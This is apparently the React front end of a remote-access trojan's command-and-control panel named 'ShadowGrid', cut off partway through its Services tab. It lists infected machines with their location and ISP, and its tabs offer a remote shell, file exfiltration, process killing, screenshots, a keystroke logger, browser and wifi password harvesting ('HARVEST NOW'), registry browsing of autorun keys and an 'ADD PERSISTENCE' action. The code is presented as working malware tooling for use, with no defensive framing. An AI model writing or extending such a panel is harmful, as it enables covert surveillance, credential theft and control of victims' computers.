import React, { useState, useEffect, useRef, useCallback } from 'react';
import { api } from '../api';
import Modal from '../components/Modal';
import ConfirmModal from '../components/ConfirmModal';

function countryFlag(code) {
  if (!code || code.length !== 2) return '';
  return String.fromCodePoint(
    ...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

const TABS = ['Terminal','Storage','Tasks','Processes','Display','Input Log','Vault','Config Store','Services','Network','Settings'];

export default function AgentModal({ agent, onClose }) {
  const [tab, setTab] = useState(0);
  const [tasks, setTasks] = useState([]);
  const [results, setResults] = useState([]);
  const [creds, setCreds] = useState([]);
  const [sleep, setSleep] = useState(agent.sleep_seconds || 5);
  const [jitter, setJitter] = useState(agent.jitter_percent || 20);

  useEffect(() => {
    api.getAgentTasks(agent.id).then(setTasks).catch(() => {});
    api.getAgentResults(agent.id).then(setResults).catch(() => {});
    api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
  }, [agent.id]);

  // Poll for new results every 3 seconds when terminal is active
  useEffect(() => {
    const interval = setInterval(() => {
      api.getAgentResults(agent.id).then(setResults).catch(() => {});
    }, 3000);
    return () => clearInterval(interval);
  }, [agent.id]);

  const statusColor = agent.status === 'dead' ? 'red' : agent.status === 'dormant' ? 'yellow' : 'green';

  const timeSince = (d) => {
    if (!d) return '-';
    const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    return Math.floor(s / 3600) + 'h ago';
  };

  return (
    <Modal onClose={onClose}>
      {/* HEADER */}
      <div className="modal-header">
        <div className="modal-header-left">
          <span className={`status-dot ${statusColor}`} />
          <span>{agent.id?.substring(0, 10).toUpperCase()}</span>
          <span style={{ color: 'var(--text-sec)' }}>{agent.hostname}</span>
          <span className="badge-admin" style={{ borderColor: `var(--${statusColor})`, color: `var(--${statusColor})` }}>
            {agent.status?.toUpperCase()}
          </span>
        </div>
        <div className="modal-header-center">
          <span>{agent.os} • {agent.arch}</span>
        </div>
        <div className="modal-header-right">
          <span>{countryFlag(agent.country)} {agent.country}{agent.city ? ' • ' + agent.city : ''}{agent.isp ? ' • ' + agent.isp : ''}</span>
          <span>{agent.ip_external || agent.ip_internal}</span>
          <span style={{ color: `var(--${statusColor})` }}>Last seen: {timeSince(agent.last_seen)}</span>
          <button className="modal-close" onClick={onClose}>✕</button>
        </div>
      </div>

      {/* TABS */}
      <div className="modal-tabs">
        {TABS.map((t, i) => (
          <button key={i} className={`modal-tab ${tab === i ? 'active' : ''}`} onClick={() => setTab(i)}>{t}</button>
        ))}
      </div>

      {/* BODY */}
      <div className="modal-body">
        {/* TAB 0: TERMINAL */}
        {tab === 0 && <TerminalTab agent={agent} results={results} />}

        {/* TAB 1: STORAGE */}
        {tab === 1 && <StorageTab agentId={agent.id} />}

        {/* TAB 2: TASKS */}
        {tab === 2 && <TasksTab tasks={tasks} results={results} />}

        {/* TAB 3: PROCESSES */}
        {tab === 3 && <ProcessesTab agentId={agent.id} />}

        {/* TAB 4: DISPLAY */}
        {tab === 4 && <DisplayTab agentId={agent.id} />}

        {/* TAB 5: INPUT LOG */}
        {tab === 5 && <InputLogTab agentId={agent.id} />}

        {/* TAB 6: VAULT */}
        {tab === 6 && <VaultTab creds={creds} agentId={agent.id} />}

        {/* TAB 7: CONFIG STORE */}
        {tab === 7 && <ConfigStoreTab agentId={agent.id} />}

        {/* TAB 8: SERVICES */}
        {tab === 8 && <ServicesTab agentId={agent.id} />}

        {/* TAB 9: NETWORK */}
        {tab === 9 && <NetworkTab agentId={agent.id} />}

        {/* TAB 10: SETTINGS */}
        {tab === 10 && <AgentSettingsTab agentId={agent.id} sleep={sleep} setSleep={setSleep} jitter={jitter} setJitter={setJitter} />}
      </div>
    </Modal>
  );
}

/* ========== TERMINAL TAB ========== */
function TerminalTab({ agent, results }) {
  const [history, setHistory] = useState([]);
  const [input, setInput] = useState('');
  const [working, setWorking] = useState(false);
  const [pendingTaskId, setPendingTaskId] = useState(null);
  const [cmdHistory, setCmdHistory] = useState([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const termRef = useRef(null);
  const inputRef = useRef(null);

  // Watch for results matching our pending task
  useEffect(() => {
    if (pendingTaskId && results) {
      const result = results.find(r => r.task_id === pendingTaskId);
      if (result) {
        setHistory(prev => [...prev, { type: 'output', text: result.output }]);
        setWorking(false);
        setPendingTaskId(null);
      }
    }
  }, [results, pendingTaskId]);

  const sendCommand = async (cmd) => {
    if (!cmd.trim()) return;
    setHistory(prev => [...prev, { type: 'input', text: cmd }]);
    setCmdHistory(prev => [cmd, ...prev]);
    setHistoryIdx(-1);
    setInput('');
    setWorking(true);

    try {
      const res = await api.createTask(agent.id, 'terminal', { cmd });
      setPendingTaskId(res.id);
    } catch (e) {
      setHistory(prev => [...prev, { type: 'error', text: e.message }]);
      setWorking(false);
    }
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      sendCommand(input);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (cmdHistory.length > 0) {
        const newIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
        setHistoryIdx(newIdx);
        setInput(cmdHistory[newIdx]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx > 0) {
        const newIdx = historyIdx - 1;
        setHistoryIdx(newIdx);
        setInput(cmdHistory[newIdx]);
      } else {
        setHistoryIdx(-1);
        setInput('');
      }
    }
  };

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [history, working]);

  useEffect(() => {
    inputRef.current?.focus();
  }, [working]);

  return (
    <div style={{ height: '100%', display: 'flex', flexDirection: 'column' }}>
      <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{
        flex: 1, background: '#0a0c10', padding: 12, fontFamily: 'var(--font-mono)',
        fontSize: 12, color: '#c8c8c8', overflow: 'auto', cursor: 'text',
        minHeight: 400,
      }}>
        <div style={{ color: 'var(--green)', marginBottom: 8 }}>
          [ShadowGrid] Connected to {agent.hostname || agent.id.substring(0,8)} ({agent.os || 'unknown'})
        </div>
        {history.map((entry, i) => (
          <div key={i} style={{ marginBottom: 2 }}>
            {entry.type === 'input' && (
              <span><span style={{ color: 'var(--green)' }}>{'>'} </span>{entry.text}</span>
            )}
            {entry.type === 'output' && (
              <pre style={{ margin: 0, whiteSpace: 'pre-wrap', color: '#e0e0e0' }}>{entry.text}</pre>
            )}
            {entry.type === 'error' && (
              <span style={{ color: 'var(--red)' }}>✕ {entry.text}</span>
            )}
          </div>
        ))}
        {working && <div style={{ color: 'var(--yellow)' }}>⏳ executing...</div>}
        <div style={{ display: 'flex', alignItems: 'center' }}>
          <span style={{ color: 'var(--green)' }}>{'>'} </span>
          <input ref={inputRef} value={input} onChange={e => setInput(e.target.value)}
            onKeyDown={handleKeyDown} disabled={working}
            autoFocus
            spellCheck="false"
            style={{
              flex: 1, background: 'transparent', border: 'none', outline: 'none',
              color: '#e0e0e0', fontFamily: 'var(--font-mono)', fontSize: 12,
              padding: 0, margin: 0,
            }} />
        </div>
      </div>
    </div>
  );
}

/* ========== STORAGE TAB ========== */
function StorageTab({ agentId }) {
  const [path, setPath] = useState(['C:']);
  const [files, setFiles] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [pendingTaskId, setPendingTaskId] = useState(null);

  const currentPath = path.join('\\');

  // Poll for results when a task is pending
  useEffect(() => {
    if (!pendingTaskId) return;
    const interval = setInterval(async () => {
      try {
        const results = await api.getAgentResults(agentId);
        const result = results.find(r => r.task_id === pendingTaskId);
        if (result) {
          clearInterval(interval);
          setPendingTaskId(null);
          setLoading(false);
          try {
            const parsed = JSON.parse(result.output);
            if (Array.isArray(parsed)) {
              // Sort: directories first, then alphabetically
              parsed.sort((a, b) => {
                if (a.is_dir && !b.is_dir) return -1;
                if (!a.is_dir && b.is_dir) return 1;
                return a.name.localeCompare(b.name);
              });
              setFiles(parsed);
              setError(null);
            } else {
              setError(result.output);
            }
          } catch {
            setError(result.output);
          }
        }
      } catch {}
    }, 2000);
    return () => clearInterval(interval);
  }, [pendingTaskId, agentId]);

  const loadFiles = async (targetPath) => {
    setLoading(true);
    setError(null);
    setFiles([]);
    try {
      const res = await api.createTask(agentId, 'storage_list', { path: targetPath || currentPath });
      setPendingTaskId(res.id);
    } catch (e) {
      setLoading(false);
      setError(e.message);
    }
  };

  const navigateTo = (folder) => {
    const newPath = [...path, folder];
    setPath(newPath);
    loadFiles(newPath.join('\\'));
  };

  const navigateUp = () => {
    if (path.length > 1) {
      const newPath = path.slice(0, -1);
      setPath(newPath);
      loadFiles(newPath.join('\\'));
    }
  };

  const navigateBreadcrumb = (index) => {
    const newPath = path.slice(0, index + 1);
    setPath(newPath);
    loadFiles(newPath.join('\\'));
  };

  const formatSize = (bytes) => {
    if (bytes === 0) return '-';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
  };

  const formatDate = (ts) => {
    if (!ts) return '-';
    return new Date(ts * 1000).toLocaleString();
  };

  const downloadFile = async (fileName) => {
    const filePath = currentPath + '\\' + fileName;
    await api.createTask(agentId, 'storage_read', { path: filePath });
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="breadcrumb" style={{ marginBottom: 8 }}>
        {path.map((p, i) => (
          <span key={i}>
            <span style={{ cursor: 'pointer', color: 'var(--green)' }} onClick={() => navigateBreadcrumb(i)}>{p}</span>
            {i < path.length - 1 && <span className="sep" style={{ margin: '0 4px', color: 'var(--text-muted)' }}>&gt;</span>}
          </span>
        ))}
      </div>
      <div className="toolbar" style={{ marginBottom: 12, display: 'flex', gap: 8 }}>
        <button className="btn btn-sm" onClick={navigateUp} disabled={path.length <= 1}>⬆ UP</button>
        <button className="btn btn-sm" onClick={() => loadFiles()} disabled={loading}>
          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
        </button>
      </div>
      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
      <table>
        <thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th>Actions</th></tr></thead>
        <tbody>
          {files.length === 0 && !loading && (
            <tr><td colSpan={5} style={{ color: 'var(--text-disabled)', textAlign: 'center' }}>
              Click REFRESH to browse the agent filesystem
            </td></tr>
          )}
          {loading && (
            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
              ⏳ Waiting for agent response...
            </td></tr>
          )}
          {files.map((f, i) => (
            <tr key={i}>
              <td style={{ color: f.is_dir ? 'var(--yellow)' : 'var(--text-sec)', cursor: f.is_dir ? 'pointer' : 'default' }}
                  onClick={() => f.is_dir && navigateTo(f.name)}>
                {f.is_dir ? '📁 ' : '📄 '}{f.name}
              </td>
              <td>{f.is_dir ? '-' : formatSize(f.size)}</td>
              <td>{f.is_dir ? 'Folder' : 'File'}</td>
              <td style={{ fontSize: 11 }}>{formatDate(f.modified)}</td>
              <td>
                {f.is_dir ? (
                  <button className="btn btn-sm" onClick={() => navigateTo(f.name)}>OPEN</button>
                ) : (
                  <button className="btn btn-sm" onClick={() => downloadFile(f.name)}>DOWNLOAD</button>
                )}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== PROCESSES TAB ========== */
function ProcessesTab({ agentId }) {
  const [processes, setProcesses] = useState([]);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState('');
  const [sortCol, setSortCol] = useState('pid');
  const [sortDir, setSortDir] = useState('asc');
  const [pendingTaskId, setPendingTaskId] = useState(null);
  const [killTarget, setKillTarget] = useState(null);
  const intervalRef = useRef(null);

  const fetchProcesses = useCallback(async () => {
    setLoading(true);
    try {
      const res = await api.createTask(agentId, 'task_viewer_list', {});
      setPendingTaskId(res.id);
    } catch {
      setLoading(false);
    }
  }, [agentId]);

  // Poll for results
  useEffect(() => {
    if (!pendingTaskId) return;
    const poll = setInterval(async () => {
      try {
        const results = await api.getAgentResults(agentId);
        const result = results.find(r => r.task_id === pendingTaskId);
        if (result) {
          clearInterval(poll);
          setPendingTaskId(null);
          setLoading(false);
          try {
            const parsed = JSON.parse(result.output);
            if (Array.isArray(parsed)) {
              setProcesses(parsed);
            }
          } catch {}
        }
      } catch {}
    }, 2000);
    return () => clearInterval(poll);
  }, [pendingTaskId, agentId]);

  // Auto-refresh every 10 seconds
  useEffect(() => {
    fetchProcesses();
    intervalRef.current = setInterval(fetchProcesses, 10000);
    return () => clearInterval(intervalRef.current);
  }, [fetchProcesses]);

  const handleSort = (col) => {
    if (sortCol === col) {
      setSortDir(d => d === 'asc' ? 'desc' : 'asc');
    } else {
      setSortCol(col);
      setSortDir('asc');
    }
  };

  const filtered = processes.filter(p => {
    if (!search) return true;
    const s = search.toLowerCase();
    return (p.name || '').toLowerCase().includes(s)
      || (p.user || '').toLowerCase().includes(s)
      || String(p.pid).includes(s);
  });

  const sorted = [...filtered].sort((a, b) => {
    let va = a[sortCol], vb = b[sortCol];
    if (typeof va === 'string') va = va.toLowerCase();
    if (typeof vb === 'string') vb = vb.toLowerCase();
    if (va < vb) return sortDir === 'asc' ? -1 : 1;
    if (va > vb) return sortDir === 'asc' ? 1 : -1;
    return 0;
  });

  const killProcess = async (pid) => {
    try {
      await api.createTask(agentId, 'task_viewer_kill', { pid });
      setKillTarget(null);
      setTimeout(fetchProcesses, 2000);
    } catch {}
  };

  const sortIcon = (col) => {
    if (sortCol !== col) return ' ↕';
    return sortDir === 'asc' ? ' ↑' : ' ↓';
  };

  return (
    <div style={{ padding: 16 }}>
      <div style={{ display: 'flex', gap: 8, marginBottom: 12, alignItems: 'center' }}>
        <input
          type="text"
          className="form-input"
          placeholder="Search processes..."
          value={search}
          onChange={e => setSearch(e.target.value)}
          spellCheck="false"
          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
        />
        <button className="btn btn-sm" onClick={fetchProcesses} disabled={loading}>
          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
        </button>
        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)' }}>
          {processes.length} processes
        </span>
      </div>
      <table>
        <thead>
          <tr>
            {[
              { key: 'pid', label: 'PID' },
              { key: 'name', label: 'Name' },
              { key: 'user', label: 'User' },
              { key: 'memory_mb', label: 'Memory (MB)' },
            ].map(col => (
              <th key={col.key} style={{ cursor: 'pointer', userSelect: 'none' }} onClick={() => handleSort(col.key)}>
                {col.label}{sortIcon(col.key)}
              </th>
            ))}
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          {sorted.length === 0 && !loading && (
            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>
              {processes.length === 0 ? 'Loading process list...' : 'No matching processes'}
            </td></tr>
          )}
          {loading && processes.length === 0 && (
            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
              ⏳ Waiting for agent response...
            </td></tr>
          )}
          {sorted.map((p, i) => (
            <tr key={i}>
              <td style={{ color: 'var(--green)' }}>{p.pid}</td>
              <td>{p.name}</td>
              <td style={{ color: 'var(--text-muted)' }}>{p.user || '-'}</td>
              <td style={{ color: 'var(--text-sec)' }}>{p.memory_mb != null ? p.memory_mb.toFixed(1) : '-'}</td>
              <td>
                <button className="btn btn-sm btn-red" onClick={() => setKillTarget(p)}>KILL</button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      <ConfirmModal
        open={!!killTarget}
        title="CONFIRM KILL PROCESS"
        message={`Kill process "${killTarget?.name}" (PID ${killTarget?.pid})?`}
        detail={
          <>
            <div><span style={{ color: 'var(--text-muted)' }}>PID: </span><span style={{ color: 'var(--green)' }}>{killTarget?.pid}</span></div>
            <div><span style={{ color: 'var(--text-muted)' }}>NAME: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.name}</span></div>
            <div><span style={{ color: 'var(--text-muted)' }}>USER: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.user || '-'}</span></div>
          </>
        }
        confirmLabel="KILL"
        onConfirm={() => killProcess(killTarget?.pid)}
        onCancel={() => setKillTarget(null)}
      />
    </div>
  );
}

/* ========== TASKS TAB ========== */
function TasksTab({ tasks, results }) {
  const [filter, setFilter] = useState('all');
  const [expandedTask, setExpandedTask] = useState(null);
  const filtered = filter === 'all' ? tasks : tasks.filter(t => t.status === filter);

  const getOutput = (taskId) => {
    const r = results?.find(r => r.task_id === taskId);
    return r ? r.output : null;
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="filter-bar">
        {['all','pending','sent','completed','failed'].map(f => (
          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
        ))}
      </div>
      <table>
        <thead><tr><th>ID</th><th>Type</th><th>Args</th><th>Status</th><th>Created</th><th>Output</th></tr></thead>
        <tbody>
          {filtered.length === 0 ? (
            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No tasks</td></tr>
          ) : filtered.map(t => {
            const output = getOutput(t.id);
            const isExpanded = expandedTask === t.id;
            return (
              <React.Fragment key={t.id}>
                <tr style={{ cursor: output ? 'pointer' : 'default' }} onClick={() => output && setExpandedTask(isExpanded ? null : t.id)}>
                  <td>TSK-{String(t.id).padStart(3,'0')}</td>
                  <td>{t.task_type}</td>
                  <td style={{ maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{t.args_json}</td>
                  <td style={{ color: t.status === 'completed' ? 'var(--green)' : t.status === 'failed' ? 'var(--red)' : t.status === 'pending' ? 'var(--yellow)' : 'var(--blue)' }}>
                    {t.status?.toUpperCase()}
                  </td>
                  <td>{t.created_at ? new Date(t.created_at).toLocaleTimeString() : '-'}</td>
                  <td>
                    {output ? (
                      <span style={{ color: 'var(--green)', fontSize: 10, fontFamily: 'var(--font-mono)' }}>
                        {isExpanded ? '▼ COLLAPSE' : '▶ VIEW'}
                      </span>
                    ) : t.status === 'completed' ? (
                      <span style={{ color: 'var(--text-muted)', fontSize: 10 }}>no output</span>
                    ) : (
                      <span style={{ color: 'var(--text-disabled)', fontSize: 10 }}>waiting...</span>
                    )}
                  </td>
                </tr>
                {isExpanded && output && (
                  <tr>
                    <td colSpan={6} style={{ padding: 0 }}>
                      <pre style={{
                        margin: 0,
                        padding: 12,
                        background: '#0d0f12',
                        border: '1px solid var(--border)',
                        fontFamily: 'var(--font-mono)',
                        fontSize: 11,
                        color: 'var(--green)',
                        whiteSpace: 'pre-wrap',
                        wordBreak: 'break-all',
                        maxHeight: 300,
                        overflow: 'auto',
                      }}>{(() => {
                        try {
                          const parsed = JSON.parse(output);
                          return JSON.stringify(parsed, null, 2);
                        } catch { return output; }
                      })()}</pre>
                    </td>
                  </tr>
                )}
              </React.Fragment>
            );
          })}
        </tbody>
      </table>
    </div>
  );
}

/* ========== DISPLAY TAB ========== */
function DisplayTab({ agentId }) {
  const [captures, setCaptures] = useState([]);
  const [autoCapture, setAutoCapture] = useState(false);

  const takeCapture = () => {
    api.createTask(agentId, 'display_capture', {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={takeCapture}>CAPTURE</button>
        <button className={`btn btn-sm ${autoCapture ? 'active' : ''}`} onClick={() => setAutoCapture(!autoCapture)}>
          AUTO-CAPTURE ({autoCapture ? 'ON' : 'OFF'})
        </button>
        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginLeft: 12 }}>INTERVAL: 30S</span>
      </div>
      <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', minHeight: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: 12 }}>
        <div style={{ textAlign: 'center' }}>
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--text-disabled)" strokeWidth="1"><rect x="2" y="3" width="20" height="14"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-disabled)', marginTop: 12, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            No captures yet. Click CAPTURE to take a screenshot.
          </div>
        </div>
      </div>
      <div style={{ marginTop: 16 }}>
        <div className="section-label">Capture History</div>
        <div style={{ display: 'flex', gap: 8 }}>
          {captures.length === 0 && [0,1,2].map(i => (
            <div key={i} style={{ width: 120, height: 75, border: '1px solid var(--border)', background: 'var(--term-bg)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--font-mono)', fontSize: 9, color: 'var(--text-disabled)' }}>EMPTY</div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ========== INPUT LOG TAB ========== */
function InputLogTab({ agentId }) {
  const [monitoring, setMonitoring] = useState(false);
  const [logs, setLogs] = useState([]);

  const startMonitor = () => {
    api.createTask(agentId, 'input_monitor_start', {});
    setMonitoring(true);
  };
  const stopMonitor = () => {
    api.createTask(agentId, 'input_monitor_stop', {});
    setMonitoring(false);
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={startMonitor}>START</button>
        <button className="btn btn-red" onClick={stopMonitor}>STOP</button>
        <button className="btn btn-sm" onClick={() => setLogs([])}>CLEAR LOG</button>
        <button className="btn btn-sm">EXPORT</button>
        {monitoring && <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--green)', marginLeft: 12 }}>● RECORDING</span>}
      </div>
      <div className="keystroke-display" style={{ marginTop: 12, minHeight: 300 }}>
        {logs.length === 0 ? (
          <div style={{ color: 'var(--text-disabled)' }}>No keystrokes captured. Click START to begin monitoring.</div>
        ) : logs.map((l, i) => (
          <div key={i}>
            <span className="ks-time">[{l.time}]</span> <span className="ks-app">{l.app}:</span> {l.text}
          </div>
        ))}
      </div>
    </div>
  );
}

/* ========== VAULT TAB ========== */
function VaultTab({ creds, agentId }) {
  const [filter, setFilter] = useState('all');
  const filtered = filter === 'all' ? creds : creds.filter(c => c.source?.toLowerCase() === filter);

  const harvest = () => {
    api.createTask(agentId, 'vault_reader', { targets: ['chrome','firefox','edge','wifi','system'] });
  };

  const copyPw = (pw) => {
    navigator.clipboard.writeText(pw).catch(() => {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="filter-bar">
        {['all','chrome','firefox','edge','wifi','system'].map(f => (
          <button key={f} className={`btn ${filter === f ? 'active' : ''}`} onClick={() => setFilter(f)}>{f.toUpperCase()}</button>
        ))}
        <button className="btn btn-green" style={{ marginLeft: 'auto' }} onClick={harvest}>HARVEST NOW</button>
      </div>
      <table>
        <thead><tr><th>Source</th><th>URL</th><th>Username</th><th>Password</th><th>Harvested</th><th></th></tr></thead>
        <tbody>
          {filtered.length === 0 ? (
            <tr><td colSpan={6} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No credentials. Click HARVEST NOW.</td></tr>
          ) : filtered.map(c => (
            <tr key={c.id}>
              <td>{c.source}</td>
              <td style={{ color: 'var(--text-sec)' }}>{c.url}</td>
              <td>{c.username}</td>
              <td><span className="pw-plain">{c.password}</span></td>
              <td>{c.created_at ? new Date(c.created_at).toLocaleTimeString() : '-'}</td>
              <td><button className="copy-btn" onClick={() => copyPw(c.password)}>COPY</button></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ========== CONFIG STORE TAB ========== */
function ConfigStoreTab({ agentId }) {
  const [hive, setHive] = useState('HKLM');
  const [regPath, setRegPath] = useState('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
  const [pathInput, setPathInput] = useState('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
  const [values, setValues] = useState([]);
  const [subkeys, setSubkeys] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [pendingValuesTask, setPendingValuesTask] = useState(null);
  const [pendingSubkeysTask, setPendingSubkeysTask] = useState(null);

  // Parse "HKLM\SOFTWARE\..." into hive + path
  const parsePath = (fullPath) => {
    const parts = fullPath.split('\\');
    const h = parts[0].replace('HKEY_LOCAL_MACHINE', 'HKLM')
      .replace('HKEY_CURRENT_USER', 'HKCU')
      .replace('HKEY_CLASSES_ROOT', 'HKCR')
      .replace('HKEY_USERS', 'HKU');
    return { hive: h, path: parts.slice(1).join('\\') };
  };

  // Poll for subkeys result
  useEffect(() => {
    if (!pendingSubkeysTask) return;
    const interval = setInterval(async () => {
      try {
        const results = await api.getAgentResults(agentId);
        const result = results.find(r => r.task_id === pendingSubkeysTask);
        if (result) {
          clearInterval(interval);
          setPendingSubkeysTask(null);
          try {
            const parsed = JSON.parse(result.output);
            if (Array.isArray(parsed)) {
              setSubkeys(parsed);
            }
          } catch {}
          setLoading(false);
        }
      } catch {}
    }, 2000);
    return () => clearInterval(interval);
  }, [pendingSubkeysTask, agentId]);

  // Poll for values result
  useEffect(() => {
    if (!pendingValuesTask) return;
    const interval = setInterval(async () => {
      try {
        const results = await api.getAgentResults(agentId);
        const result = results.find(r => r.task_id === pendingValuesTask);
        if (result) {
          clearInterval(interval);
          setPendingValuesTask(null);
          try {
            const parsed = JSON.parse(result.output);
            if (parsed && !Array.isArray(parsed)) {
              setValues(prev => [...prev, parsed]);
            }
          } catch {}
        }
      } catch {}
    }, 2000);
    return () => clearInterval(interval);
  }, [pendingValuesTask, agentId]);

  const browseKey = async (fullPath) => {
    const { hive: h, path: p } = parsePath(fullPath || pathInput);
    setHive(h);
    setRegPath(p);
    setPathInput(fullPath || pathInput);
    setLoading(true);
    setError(null);
    setSubkeys([]);
    setValues([]);

    try {
      // List subkeys
      const res = await api.createTask(agentId, 'config_store_list', { hive: h, path: p });
      setPendingSubkeysTask(res.id);
    } catch (e) {
      setLoading(false);
      setError(e.message);
    }
  };

  const navigateSubkey = (subkeyName) => {
    const newFullPath = hive + '\\' + (regPath ? regPath + '\\' : '') + subkeyName;
    setPathInput(newFullPath);
    browseKey(newFullPath);
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      browseKey();
    }
  };

  const regTypeToString = (t) => {
    const types = { 1: 'REG_SZ', 2: 'REG_EXPAND_SZ', 3: 'REG_BINARY', 4: 'REG_DWORD', 7: 'REG_MULTI_SZ', 11: 'REG_QWORD' };
    return types[t] || 'REG_' + t;
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="section-label">Registry Browser</div>
      <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
        <input
          type="text"
          className="form-input"
          value={pathInput}
          onChange={e => setPathInput(e.target.value)}
          onKeyDown={handleKeyDown}
          placeholder="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
          spellCheck="false"
          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
        />
        <button className="btn btn-sm btn-green" onClick={() => browseKey()} disabled={loading}>
          {loading ? '⏳' : 'BROWSE'}
        </button>
      </div>
      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
      <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: 16 }}>
        <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', padding: 12, fontFamily: 'var(--font-mono)', fontSize: 11, minHeight: 300, overflowY: 'auto' }}>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            Subkeys
          </div>
          {loading && <div style={{ color: 'var(--yellow)' }}>⏳ Loading...</div>}
          {subkeys.length === 0 && !loading && <div style={{ color: 'var(--text-disabled)' }}>No subkeys found</div>}
          {subkeys.map((sk, i) => (
            <div key={i} className="reg-node" style={{ padding: '4px 8px', cursor: 'pointer', color: 'var(--green)' }}
                 onClick={() => navigateSubkey(sk)}>
              <span className="reg-icon">📁</span> {sk}
            </div>
          ))}
        </div>
        <div>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
            {hive}\\{regPath}
          </div>
          <table>
            <thead><tr><th>Name</th><th>Type</th><th>Data</th></tr></thead>
            <tbody>
              {values.length === 0 ? (
                <tr><td colSpan={3} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>Click BROWSE to load registry values</td></tr>
              ) : values.map((v, i) => (
                <tr key={i}>
                  <td>{v.name}</td>
                  <td style={{ color: 'var(--text-muted)' }}>{regTypeToString(v.type)}</td>
                  <td style={{ fontFamily: 'var(--font-mono)', fontSize: 11, wordBreak: 'break-all' }}>{v.value}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

/* ========== SERVICES TAB ========== */
function ServicesTab({ agentId }) {
  const [services, setServices] = useState([]);

  const addPersistence = () => {
    api.createTask(agentId, 'service_manager_install', {});
  };
  const refresh = () => {
    api.createTask(agentId, 'boot_entries_list', {});
  };

  return (
    <div style={{ padding: 16 }}>
      <div className="toolbar">
        <button className="btn btn-green" onClick={addPersistence}>ADD PERSISTENCE</button>
        <button className="btn btn-sm" onClick={refresh}>REFRESH</button>
      </div>
      <table>
        <thead><tr><th>Name</th><th>Path</th><th>Type</th><th>Status</th><th>Actions</th></tr></thead>
        <tbody>
          {services.length === 0 ? (
